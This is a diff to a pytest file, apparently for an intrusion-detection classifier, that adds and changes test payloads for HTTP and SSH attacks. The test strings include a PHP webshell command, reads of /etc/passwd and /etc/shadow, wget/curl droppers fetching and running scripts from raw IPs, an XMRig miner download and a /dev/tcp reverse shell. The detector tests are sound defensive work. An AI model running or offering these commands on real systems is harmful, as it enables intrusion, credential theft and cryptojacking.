@@ -88,6 +88,18 @@ class TestHTTPAttacks:
         assert name in ("Destructive", "Exploit"), \
             f"Destructive HTTP classified as {name}"
 
+    def test_http_webshell_exec(self, model):
+        _, name, conf, probs = predict_single(
+            model,
+            "POST /shell.php HTTP/1.1\n"
+            "Host: target.com\n"
+            "\n"
+            "cmd=id;uname -a;cat /etc/passwd",
+            is_http=True,
+        )
+        assert name == "Exploit", \
+            f"PHP Webshell execution classified as {name}"
+
 
 # ════════════════════════════════════════════
 # SSH Attack Payloads
@@ -101,7 +113,7 @@ class TestSSHAttacks:
     def test_safe_ssh_commands(self, model):
         _, name, conf, _ = predict_single(
             model,
-            "ls; pwd; cd /home; exit",
+            "tar -czvf /backup/site.tar.gz /var/www/html; ls -lh /backup",
             is_http=False,
         )
         assert name == "Safe", \
@@ -115,17 +127,33 @@ class TestSSHAttacks:
         )
         assert name == "Safe"
 
+    def test_safe_ssh_sysadmin(self, model):
+        _, name, conf, _ = predict_single(
+            model,
+            "systemctl restart docker; journalctl -u docker -n 50",
+            is_http=False,
+        )
+        assert name == "Safe", \
+            f"Sysadmin commands classified as {name}"
+
+    def test_safe_ssh_git_deploy(self, model):
+        _, name, conf, _ = predict_single(
+            model,
+            "git fetch origin; git checkout main; git pull origin main; npm run build",
+            is_http=False,
+        )
+        assert name == "Safe", \
+            f"Git deployment classified as {name}"
+
     # ── SSH Recon / Discovery ──
 
     def test_ssh_recon_basic(self, model):
         _, name, conf, probs = predict_single(
             model,
-            "id; whoami; uname -a; "
-            "cat /etc/passwd; "
-            "netstat -tlnp; ps aux",
+            "cat /proc/cpuinfo; cat /proc/meminfo; uname -a; ip route",
             is_http=False,
         )
-        assert name in ("Recon", "Exploit"), \
+        assert name in ("Recon", "Exploit", "ADVANCED_APT"), \
             f"SSH recon classified as {name}"
 
     def test_ssh_network_scan(self, model):
@@ -139,15 +167,21 @@ class TestSSHAttacks:
         assert name in ("Recon", "Exploit"), \
             f"Network scan classified as {name}"
 
+    def test_ssh_user_enum(self, model):
+        _, name, conf, probs = predict_single(
+            model,
+            "cat /etc/shadow; cat /etc/passwd; cat /etc/hosts",
+            is_http=False,
+        )
+        assert name in ("Recon", "Destructive", "ADVANCED_APT"), \
+            f"User enumeration classified as {name}"
+
     # ── SSH Downloader ──
 
     def test_ssh_wget_dropper(self, model):
         _, name, conf, probs = predict_single(
             model,
-            "cd /tmp; "
-            "wget http://evil.com/malware -O rat; "
-            "chmod +x rat; "
-            "./rat",
+            "cd /tmp ; wget http://46.246.45.171/wget.sh || curl -O http://46.246.45.171/curl.sh; chmod +x *; ./wget.sh",
             is_http=False,
         )
         assert name in ("Downloader", "Exploit", "ADVANCED_APT"), \
@@ -161,6 +195,16 @@ class TestSSHAttacks:
         )
         assert name in ("Downloader", "Exploit", "ADVANCED_APT"), \
             f"Curl dropper classified as {name}"
+
+    def test_ssh_xmrig_miner(self, model):
+        _, name, conf, probs = predict_single(
+            model,
+            "cd /tmp; wget http://45.9.148.115/xmrig; chmod +x xmrig; ./xmrig -o pool.supportxmr.com:3333",
+            is_http=False,
+        )
+        assert name in ("Downloader", "Destructive", "ADVANCED_APT"), \
+            f"XMRig miner execution classified as {name}"
+
 
     # ── SSH Destructive ──
 
@@ -207,7 +251,7 @@ class TestSSHAttacks:
     def test_ssh_reverse_shell(self, model):
         _, name, conf, probs = predict_single(
             model,
-            "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
+            "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1; whoami; id",
             is_http=False,
         )
         assert name != "Safe", \
